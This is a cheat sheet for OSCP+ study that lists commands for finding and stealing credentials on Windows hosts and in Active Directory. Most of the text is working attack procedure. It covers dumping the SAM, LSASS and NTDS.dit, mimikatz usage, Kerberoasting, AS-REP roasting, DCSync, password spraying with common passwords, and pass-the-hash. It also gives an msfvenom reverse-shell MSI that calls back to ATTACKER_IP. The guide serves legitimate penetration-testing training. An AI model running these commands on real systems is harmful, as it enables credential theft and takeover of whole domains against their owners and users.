# Password Discovery — Windows & Active Directory

## 📖 Overview

During post-exploitation or privilege escalation, cleartext passwords, credentials, and sensitive data can often be found in predictable locations. This guide covers **Windows local** and **Active Directory** credential discovery — both critical for OSCP+.

---

# 🖥️ PART 1 — WINDOWS LOCAL

---

## 🔍 1. PowerShell History

PowerShell logs all commands typed by users. Credentials are often passed in plaintext.

```cmd
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**PowerShell:**

```powershell
Get-Content (Get-PSReadLineOption).HistorySavePath
```

**Check all users (requires admin):**

```cmd
for /d %u in (C:\Users\*) do @type "%u\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul && echo === %u ===
```

**What to look for:**

```
net user administrator P@ssw0rd
Invoke-Command -Credential ...
$password = "..."
ConvertTo-SecureString "..."
New-PSSession -Credential ...
Enter-PSSession ...
$cred = New-Object System.Management.Automation.PSCredential("admin", $securePass)
```

---

## 🔍 2. Saved Windows Credentials (Credential Manager)

```cmd
cmdkey /list
```

If saved credentials are found, use them with `runas`:

```cmd
runas /savecred /user:administrator cmd.exe
runas /savecred /user:DOMAIN\admin cmd.exe
```

**PowerShell — Extract from Credential Manager:**

```powershell
Get-StoredCredential -Target * | Format-List
```

---

## 🔍 3. Unattend / Sysprep Files

Automated Windows installations often leave credentials in XML files.

```cmd
type C:\unattend.xml
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattend\unattend.xml
type C:\Windows\system32\sysprep\unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep\Panther\unattend.xml
```

**Search for all of them at once:**

```cmd
dir /s /b C:\*unattend.xml C:\*sysprep.xml 2>nul
```

**What to look for inside:**

```xml
<AutoLogon>
    <Username>Administrator</Username>
    <Password>
        <Value>UEBzc3cwcmQ=</Value>    <!-- Base64 encoded -->
        <PlainText>false</PlainText>
    </Password>
</AutoLogon>

<Credentials>
    <Username>admin</Username>
    <Domain>CORP</Domain>
    <Password>P@ssw0rd</Password>
</Credentials>
```

**Decode base64 password:**

```cmd
powershell -c "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UEBzc3cwcmQ='))"
```

---

## 🔍 4. IIS Web Configuration

IIS stores database connection strings and credentials.

```cmd
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

**Search all web.config files:**

```cmd
dir /s /b C:\inetpub\*web.config 2>nul
```

**What to look for:**

```xml
<connectionStrings>
    <add connectionString="Server=db;Database=app;User Id=sa;Password=P@ssw0rd123;" />
</connectionStrings>

<appSettings>
    <add key="ApiKey" value="sk-12345..." />
</appSettings>

<identity impersonate="true" userName="admin" password="secret" />
```

---

## 🔍 5. Registry — AutoLogon Credentials

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

**One-liner:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

---

## 🔍 6. Registry — Saved Passwords (PuTTY, VNC, WinSCP)

**PuTTY saved sessions & proxy passwords:**

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\SimonTatham\PuTTY\SshHostKeys"
```

**VNC passwords:**

```cmd
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password
reg query "HKCU\SOFTWARE\TightVNC\Server" /v Password
reg query "HKCU\SOFTWARE\TigerVNC\WinVNC4" /v Password
```

**WinSCP stored sessions:**

```cmd
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s
```

**SNMP community strings:**

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"
```

---

## 🔍 7. Registry — Search for "password" Keyword

```cmd
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
```

> ⚠️ This takes a long time but can find hidden credentials.

---

## 🔍 8. WiFi Passwords

```cmd
netsh wlan show profiles
netsh wlan show profile name="WiFi-Name" key=clear
```

**Dump all WiFi passwords:**

```cmd
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile name="%a" key=clear 2>nul | findstr "Key Content"
```

---

## 🔍 9. SAM & SYSTEM Hives

If you have admin/SYSTEM access, dump the password hashes:

```cmd
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security
```

**On Kali — Extract hashes:**

```bash
secretsdump.py -sam sam -system system -security security LOCAL
```

Or use **mimikatz** on the target:

```cmd
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

---

## 🔍 10. LSASS Memory Dump

Dump credentials from memory (requires SeDebugPrivilege or SYSTEM):

**Using procdump:**

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Using comsvcs.dll (no external tools):**

```cmd
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

**On Kali — Extract credentials:**

```bash
pypykatz lsa minidump lsass.dmp
```

Or:

```
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

---

## 🔍 11. Filesystem Searches

**Search for files containing "password":**

```cmd
findstr /si "password" *.txt *.xml *.ini *.config *.cfg *.log
findstr /si "password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini 2>nul
```

**Search for interesting filenames:**

```cmd
dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*login* 2>nul
dir /s /b C:\Users\*.kdbx C:\Users\*.key C:\Users\*.pem C:\Users\*.ppk 2>nul
```

**Common sensitive files:**

```cmd
type C:\Users\%USERNAME%\.aws\credentials
type C:\Users\%USERNAME%\.azure\accessTokens.json
type C:\Users\%USERNAME%\.git-credentials
type C:\Users\%USERNAME%\.gitconfig
type C:\Users\%USERNAME%\.env
type C:\Users\%USERNAME%\Desktop\*.txt
type C:\Users\%USERNAME%\Documents\*.txt
```

---

## 🔍 12. Scheduled Tasks with Credentials

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"
```

**Check individual task XML files:**

```cmd
dir /s /b C:\Windows\System32\Tasks\* 2>nul
type C:\Windows\System32\Tasks\<TaskName>
```

---

## 🔍 13. Services with Hardcoded Credentials

```cmd
wmic service get name,pathname,startname 2>nul | findstr /i /v "LocalSystem NT AUTHORITY"
```

Check service configurations for credentials:

```cmd
sc qc <ServiceName>
```

---

## 🔍 14. Browser Saved Passwords

**Chrome saved passwords (encrypted, need tools):**

```cmd
dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
```

**Firefox saved passwords:**

```cmd
dir "%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json"
dir "%APPDATA%\Mozilla\Firefox\Profiles\*\key4.db"
```

**Tools to extract:**

```cmd
LaZagne.exe all
SharpChrome.exe logins
```

---

## 🔍 15. Clipboard Content

```powershell
Get-Clipboard
```

---

## 🔍 16. Recently Run Commands

**CMD history (current session only):**

```cmd
doskey /history
```

**Run dialog history:**

```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

---

## 🔍 17. DPAPI — Decrypting Protected Data

Windows Data Protection API stores encrypted secrets. With the user's password you can decrypt:

```cmd
# Find DPAPI master keys
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Protect\* 2>nul

# Find DPAPI credential files
dir /s /b C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul
dir /s /b C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
```

**Decrypt with mimikatz:**

```
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\<GUID>
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc
```

---

## 🔍 18. KeePass Database Files

```cmd
dir /s /b C:\Users\*.kdbx 2>nul
dir /s /b C:\*.kdbx 2>nul
```

**If found, crack with hashcat or john:**

```bash
# Extract hash
keepass2john Database.kdbx > keepass_hash.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt

# Crack with hashcat (mode 13400)
hashcat -m 13400 keepass_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔍 19. Database Files & Connection Strings

```cmd
# MySQL
type "C:\ProgramData\MySQL\MySQL Server*\my.ini" 2>nul
type "C:\Program Files\MySQL\MySQL Server*\my.ini" 2>nul

# MSSQL
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s 2>nul | findstr /i "password"

# PostgreSQL
type "%APPDATA%\postgresql\pgpass.conf" 2>nul

# Search for .sql files with credentials
findstr /si "password" C:\*.sql 2>nul
```

---

## 🔍 20. AlwaysInstallElevated (MSI Abuse)

Not directly password disclosure, but allows privilege escalation via MSI packages:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both return `1`, generate malicious MSI:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i evil.msi
```

---

# 🏢 PART 2 — ACTIVE DIRECTORY CREDENTIAL DISCOVERY

---

## 🔍 21. Group Policy Preferences (GPP) — cpassword

GPP passwords stored in SYSVOL are encrypted with a **publicly known AES key** (Microsoft published it).

**From a domain-joined machine:**

```cmd
findstr /si "cpassword" \\<DC>\SYSVOL\<domain>\Policies\*.xml 2>nul
```

**Common GPP locations:**

```
\\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Groups\Groups.xml
\\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Services\Services.xml
\\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
\\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\DataSources\DataSources.xml
\\<DC>\SYSVOL\<domain>\Policies\*\Machine\Preferences\Drives\Drives.xml
```

**What cpassword looks like:**

```xml
<Properties ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" ... />
```

**Decrypt on Kali:**

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Automated with Metasploit:**

```bash
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <DC_IP>
run
```

**Automated with CrackMapExec:**

```bash
crackmapexec smb <DC_IP> -u user -p pass -M gpp_password
```

---

## 🔍 22. SYSVOL & NETLOGON Shares — Scripts & Config Files

Admins often leave scripts with hardcoded credentials in SYSVOL and NETLOGON.

```cmd
dir \\<DC>\SYSVOL\ /s /b 2>nul
dir \\<DC>\NETLOGON\ /s /b 2>nul
```

**Search for passwords inside scripts:**

```cmd
findstr /si "password" \\<DC>\SYSVOL\*.vbs \\<DC>\SYSVOL\*.bat \\<DC>\SYSVOL\*.ps1 \\<DC>\SYSVOL\*.cmd 2>nul
findstr /si "password" \\<DC>\NETLOGON\*.vbs \\<DC>\NETLOGON\*.bat \\<DC>\NETLOGON\*.ps1 2>nul
```

**What to look for:**

```vbs
' Logon script with hardcoded password
strUser = "svc_backup"
strPassword = "B@ckup2024!"
```

---

## 🔍 23. AS-REP Roasting (No Pre-Authentication)

If a user has **"Do not require Kerberos preauthentication"** enabled, you can request their AS-REP hash **without credentials**.

**Find vulnerable users with PowerView:**

```powershell
Get-DomainUser -PreauthNotRequired
```

**With Impacket (from Kali, no creds needed):**

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep_hashes.txt
```

**With credentials:**

```bash
impacket-GetNPUsers <domain>/<user>:<password> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep_hashes.txt
```

**Crack with hashcat (mode 18200):**

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Crack with john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

## 🔍 24. Kerberoasting (Service Account Passwords)

Any authenticated domain user can request TGS tickets for service accounts (SPNs) and crack them offline.

**With PowerView:**

```powershell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

**Request tickets with Rubeus:**

```cmd
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt
```

**With Impacket (from Kali):**

```bash
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt
```

**Crack with hashcat (mode 13100):**

```bash
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Crack with john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

> ⚠️ Service accounts often have weak passwords and high privileges — this is a goldmine.

---

## 🔍 25. DCSync — Dumping All Domain Hashes

Requires **Replicating Directory Changes** privileges (Domain Admins, Enterprise Admins, or accounts with explicit DCSync rights).

**With mimikatz:**

```cmd
mimikatz # lsadump::dcsync /domain:<domain> /user:administrator
mimikatz # lsadump::dcsync /domain:<domain> /all /csv
```

**With Impacket (from Kali):**

```bash
impacket-secretsdump <domain>/<user>:<password>@<DC_IP>
```

**With CrackMapExec:**

```bash
crackmapexec smb <DC_IP> -u admin -p password --ntds
```

> This dumps **every user hash** in the domain — NTLM, Kerberos keys, and password history.

---

## 🔍 26. NTDS.dit — Domain Database File

The NTDS.dit file on the DC contains all AD password hashes.

**Using Volume Shadow Copy (requires admin on DC):**

```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

**Extract on Kali:**

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

---

## 🔍 27. Password Spraying

Test a single password against all domain users. Avoid lockouts (check lockout policy first).

**Check lockout policy:**

```cmd
net accounts /domain
```

**With CrackMapExec:**

```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success
```

**With Kerbrute (Kerberos-based, stealthier):**

```bash
kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password123!'
```

**With Spray.ps1 (from domain-joined machine):**

```powershell
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password123!' -Domain <domain>
```

> ⚠️ Always check the lockout threshold first. Usually spray 1 password, wait 30 mins, then spray next.

**Common passwords to try:**

```
Season+Year (Summer2024!, Winter2025!)
Company+Year (Corp2024!)
Password123!
Welcome1!
```

---

## 🔍 28. LDAP Anonymous / Authenticated Queries

**Anonymous LDAP bind (check if allowed):**

```bash
ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=com"
```

**Authenticated — search for descriptions with passwords:**

```bash
ldapsearch -x -H ldap://<DC_IP> -D "<domain>\<user>" -w '<password>' -b "dc=domain,dc=com" "(description=*)" description
```

**PowerShell — search AD user descriptions:**

```powershell
Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description -like "*pass*" } | Select Name, Description
```

> Admins often put temporary passwords in the **Description** or **Info** field of user objects.

---

## 🔍 29. LAPS — Local Administrator Password Solution

LAPS stores unique local admin passwords in AD. If you can read the `ms-Mcs-AdmPwd` attribute, you get the local admin password.

**Check if LAPS is installed:**

```cmd
dir "C:\Program Files\LAPS" 2>nul
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" 2>nul
```

**Read LAPS password (if you have permission):**

```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_.'ms-Mcs-AdmPwd' } | Select Name, ms-Mcs-AdmPwd
```

**With CrackMapExec:**

```bash
crackmapexec ldap <DC_IP> -u user -p pass --module laps
```

**With LAPSDumper:**

```bash
python3 laps.py -u user -p pass -d <domain> -l <DC_IP>
```

---

## 🔍 30. SMB Shares — Exposed Credentials

**Enumerate accessible shares:**

```bash
crackmapexec smb <TARGET_RANGE> -u user -p pass --shares
smbclient -L //<TARGET_IP> -U user
```

**Spider shares for password files:**

```bash
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
```

**Common findings in shares:**

```
\\server\IT\passwords.xlsx
\\server\Backups\scripts\deploy.ps1  (with hardcoded creds)
\\server\HR\onboarding\new_user_creds.docx
\\server\Share\web.config
```

**Manual search:**

```cmd
findstr /si "password" \\<server>\share\*.txt \\<server>\share\*.ps1 \\<server>\share\*.bat 2>nul
```

---

## 🔍 31. Mimikatz — Full AD Credential Extraction

**Dump logon passwords from memory:**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

**Dump Kerberos tickets:**

```cmd
mimikatz # sekurlsa::tickets /export
```

**Dump cached domain credentials:**

```cmd
mimikatz # lsadump::cache
```

**Dump domain trust keys:**

```cmd
mimikatz # lsadump::trust /patch
```

**Pass-the-Hash:**

```cmd
mimikatz # sekurlsa::pth /user:administrator /domain:<domain> /ntlm:<NTLM_HASH> /run:cmd
```

---

## 🔍 32. Bloodhound — Find Credential Paths

Not direct password discovery, but finds **paths** to credentials.

**Collect data with SharpHound:**

```cmd
.\SharpHound.exe -c All
```

**From Kali:**

```bash
bloodhound-python -u user -p pass -d <domain> -dc <DC_IP> -c All
```

**Key queries in Bloodhound:**

```
- Shortest Path to Domain Admins
- Find Users with DCSync Rights
- Find Kerberoastable Users
- Find AS-REP Roastable Users
- Find Users with Local Admin Rights
```

---

# ⚡ QUICK CHECKLISTS

---

## Windows Local — Quick One-Liner

```cmd
echo === PowerShell History ===
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul

echo === Saved Credentials ===
cmdkey /list

echo === AutoLogon ===
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"

echo === Unattend Files ===
dir /s /b C:\*unattend.xml C:\*sysprep.xml 2>nul

echo === Web Config ===
type C:\inetpub\wwwroot\web.config 2>nul

echo === PuTTY Sessions ===
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul

echo === VNC Password ===
reg query "HKLM\SOFTWARE\RealVNC" /s 2>nul

echo === WiFi Passwords ===
netsh wlan show profiles 2>nul

echo === Interesting Files ===
dir /s /b C:\Users\*password* C:\Users\*cred* C:\Users\*.kdbx 2>nul

echo === Git Credentials ===
type C:\Users\%USERNAME%\.git-credentials 2>nul

echo === AWS Credentials ===
type C:\Users\%USERNAME%\.aws\credentials 2>nul

echo === AlwaysInstallElevated ===
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

---

## Active Directory — Quick Checklist (from Kali)

```bash
# 1. GPP Passwords
crackmapexec smb <DC_IP> -u user -p pass -M gpp_password

# 2. AS-REP Roasting
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat

# 3. Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC_IP> -request

# 4. LDAP Description Field
ldapsearch -x -H ldap://<DC_IP> -D "<domain>\<user>" -w '<password>' -b "dc=domain,dc=com" "(description=*pass*)" description sAMAccountName

# 5. LAPS
crackmapexec ldap <DC_IP> -u user -p pass --module laps

# 6. SMB Share Spider
crackmapexec smb <DC_IP> -u user -p pass -M spider_plus

# 7. Password Spray
crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success

# 8. DCSync (if DA)
impacket-secretsdump <domain>/<admin>:<password>@<DC_IP>

# 9. NTDS Dump (if DA)
crackmapexec smb <DC_IP> -u admin -p password --ntds
```

---

## 🛠️ Automated Tools

| Tool | What It Does |
|---|---|
| `winPEASany.exe` | Checks all Windows local credential locations |
| `LaZagne.exe` | Extracts passwords from browsers, WiFi, Git, etc |
| `Seatbelt.exe` | Security audit — finds creds, tokens, keys |
| `SharpUp.exe` | Checks for privilege escalation vectors |
| `SessionGopher.ps1` | Extracts PuTTY, WinSCP, RDP saved sessions |
| `mimikatz.exe` | Dumps LSASS, SAM, DPAPI, Kerberos tickets, DCSync |
| `Rubeus.exe` | Kerberoasting, AS-REP Roasting, ticket manipulation |
| `SharpHound.exe` | Bloodhound data collector for AD paths |
| `CrackMapExec` | Swiss army knife — shares, spray, GPP, LAPS, NTDS |
| `Kerbrute` | Kerberos user enumeration and password spraying |
| `PowerView.ps1` | AD enumeration — users, groups, SPNs, ACLs |

---

## 📊 Attack Priority Order (OSCP+ Exam)

```
1. PowerShell History        ← Quick win, check first
2. Credential Manager        ← cmdkey /list
3. AutoLogon Registry        ← Takes 5 seconds
4. Unattend/Sysprep Files    ← Common in lab environments
5. Web Config / DB Config    ← If web server is present
6. GPP Passwords (AD)        ← If domain-joined
7. LDAP Descriptions (AD)    ← Admins hide creds here
8. Kerberoasting (AD)        ← Any authenticated user can do
9. AS-REP Roasting (AD)      ← Can be done without creds
10. LAPS (AD)                ← If readable
11. SMB Shares               ← Spider for password files
12. Password Spraying (AD)   ← Last resort, careful of lockout
13. LSASS Dump               ← If SYSTEM/admin
14. SAM/SYSTEM Dump          ← If SYSTEM/admin
15. DCSync (AD)              ← If Domain Admin
```

---

## 📚 References

- [PayloadsAllTheThings — Windows Credential Access](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [HackTricks — Active Directory Attacks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [MITRE ATT&CK T1552 — Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)
- [MITRE ATT&CK T1558 — Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
- [ired.team — Credential Access & Discovery](https://www.ired.team/)